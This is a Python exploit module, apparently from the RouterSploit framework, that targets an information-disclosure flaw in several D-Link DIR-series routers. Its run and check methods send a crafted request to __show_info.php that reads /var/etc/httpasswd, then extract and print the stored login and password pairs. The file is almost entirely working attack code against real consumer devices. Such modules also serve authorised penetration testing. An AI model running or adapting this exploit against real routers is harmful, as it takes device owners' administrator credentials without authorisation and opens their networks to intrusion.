import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 Info Disclosure",
        "description": "Module explois information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600,"
                       "DIR-615 devices. It is possible to retrieve sensitive information such as credentials.",
        "authors": (
            "tytusromekiatomek <tytusromekiatomek[at]inbox.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
            "Aleksandr Mikhaylov <chelaxe[at]gmail.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/bugtraq/2013/Dec/11",
        ),
        "devices": (
            "D-Link DIR-300 (all)",
            "D-Link DIR-320 (all)",
            "D-Link DIR-600 (all)",
            "D-Link DIR-615 (fw 4.0)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
        )
        if response is None:
            return

        creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)

        if len(creds):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
        )
        if response is None:
            return False  # target is not vulnerable

        creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
